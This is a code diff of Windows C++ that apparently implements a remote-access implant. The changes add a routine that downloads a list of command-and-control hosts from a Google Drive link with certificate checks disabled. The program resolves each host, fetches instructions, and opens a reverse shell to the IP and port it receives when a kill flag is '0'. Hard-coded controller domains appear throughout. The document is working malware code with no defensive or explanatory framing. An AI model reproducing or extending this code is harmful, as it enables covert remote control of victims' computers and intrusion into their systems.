@@ -33,6 +33,51 @@ std::wstring getComputerName() {
 	GetComputerNameW(buffer, &cchBufferSize);
 	return std::wstring(&buffer[0]);
 }
+std::vector<std::string> getSites()
+{
+	CURL *curl_handle;
+	CURLcode res;
+	int j,i;
+	
+	std::string readBuffer;
+	std::wstring wsurl;
+	std::string surl, stest, surlkill;
+	std::string segment, sip, skill, sport;
+	//std::vector<std::string> seglist;
+    WSADATA wsaData;
+  int iResult;
+  
+  iResult = WSAStartup(MAKEWORD(2, 2), &wsaData); 
+  curl_global_init(CURL_GLOBAL_ALL);
+	curl_handle = curl_easy_init();
+	readBuffer="";
+		surl="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF";
+		//surl="http://paner.altervista.org/site.dat";
+		curl_easy_setopt(curl_handle, CURLOPT_URL, surl.c_str());
+		curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYPEER, 0L);
+		curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYHOST, 0L);
+		curl_easy_setopt(curl_handle, CURLOPT_FOLLOWLOCATION, 1);
+		curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteCallback);
+		curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, &readBuffer);
+		curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
+		res = curl_easy_perform(curl_handle);
+		std::cout << readBuffer << std::endl;
+		char *token = strtok((char *)readBuffer.c_str(), ",");
+		std::vector<int> v;
+        //MessageBox(0, surl.c_str(), "Hi", MB_ICONINFORMATION);
+        j=0;
+        std::vector<std::string> seglist;
+		while (token != NULL) {
+			v.push_back(std::strtol(token, NULL, 10));
+			seglist.push_back(token);
+			token = strtok(NULL, ",");
+			j++;
+		}
+		curl_easy_cleanup(curl_handle);
+	    curl_global_cleanup();
+		return seglist;
+	
+}
 int main(int argc, char** argv) {
 	
   
@@ -42,31 +87,41 @@ int main(int argc, char** argv) {
 	//MessageBox(0,"Hello World from DLL!\n","Hi",MB_ICONINFORMATION);
     CURL *curl_handle;
 	CURLcode res;
-	std::vector<std::wstring> sites(2);
+	int j;
+	std::vector<std::wstring> sites(5);
 	//std::wstring sites[1];
 	std::string readBuffer;
 	std::wstring wsurl;
 	std::string surl, stest, surlkill;
-	std::string segment, sip, skill, sport;
+	std::string segment, sip, skill, sport,myhost;
 	//std::vector<std::string> seglist;
     WSADATA wsaData;
   int iResult;
+  std::vector<std::string> mysites;
+  mysites=getSites();
   iResult = WSAStartup(MAKEWORD(2, 2), &wsaData); 
 	sites[0] = L"http://paner.altervista.org/";
-	IN_ADDR addr;
-	hostent* list_ip = gethostbyname("config01.homepc.it");
-	memcpy(&addr.S_un.S_addr , list_ip->h_addr, list_ip->h_length);
-	std::string ip_address =  inet_ntoa(addr);;	
 	
-	//MessageBox(0,ip_address.c_str(),"Hi",MB_ICONINFORMATION);
-	std::wstring wsTmp(ip_address.begin(), ip_address.end());
-	sites[1]=L"http://";
-    sites[1].append(wsTmp); 
-    sites[1].append(L"/"); 
+	
+	for (int j = 0; j < mysites.size(); j++)
+	{
+	
+		myhost=mysites[j];
+		IN_ADDR addr;
+		hostent* list_ip = gethostbyname(myhost.c_str());
+		memcpy(&addr.S_un.S_addr , list_ip->h_addr, list_ip->h_length);
+		std::string ip_address =  inet_ntoa(addr);;	
+		
+		//MessageBox(0,ip_address.c_str(),"Hi",MB_ICONINFORMATION);
+		std::wstring wsTmp(ip_address.begin(), ip_address.end());
+		sites[j+1]=L"http://";
+	    sites[j+1].append(wsTmp); 
+	    sites[j+1].append(L"/"); 
+    }
 	//sites[1] = L"http://config01.homepc.it/";
 	curl_global_init(CURL_GLOBAL_ALL);
 	curl_handle = curl_easy_init();
-	for (int i = 0; i < 2; i++)
+	for (int i = 0; i < mysites.size()+1; i++)
 	{
 
 		surl = "";
@@ -78,17 +133,25 @@ int main(int argc, char** argv) {
 		//MessageBoxA(0, GetMACaddress(), "Hi", MB_ICONINFORMATION);
 		
 		readBuffer="";
+		//surl="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF";
+		//surl="http://paner.altervista.org/site.dat";
 		curl_easy_setopt(curl_handle, CURLOPT_URL, surl.c_str());
+		curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYPEER, 0L);
+		curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYHOST, 0L);
+		curl_easy_setopt(curl_handle, CURLOPT_FOLLOWLOCATION, 1);
 		curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteCallback);
 		curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, &readBuffer);
 		curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
 		res = curl_easy_perform(curl_handle);
 		std::cout << readBuffer << std::endl;
-		char *token = strtok((char *)readBuffer.c_str(), "||");
+		char *token = strtok((char *)readBuffer.c_str(), ",");
 		std::vector<int> v;
         //MessageBox(0, surl.c_str(), "Hi", MB_ICONINFORMATION);
         int j=0;
-        std::vector<std::string> seglist;
+        
+        
+		   // MessageBox(0,token,"Hi",MB_ICONINFORMATION);
+		std::vector<std::string> seglist;
 		while (token != NULL) {
 			v.push_back(std::strtol(token, NULL, 10));
 			seglist.push_back(token);
@@ -101,6 +164,7 @@ int main(int argc, char** argv) {
 			sip = seglist[1].substr(3);
 			sport = seglist[2].substr(5);
 			skill = seglist[3].substr(5);
+			//MessageBox(0,skill.c_str(),"Hi",MB_ICONINFORMATION);
 			if (skill == "0")
 			{
 				frevshell(sip.c_str(), sport.c_str());
@@ -110,6 +174,7 @@ int main(int argc, char** argv) {
 				res = curl_easy_perform(curl_handle);
 			}
 		}
+		
 		//for (std::size_t i = 0; i < v.size(); ++i)
 		//	std::cout << v[i] << std::endl;
 
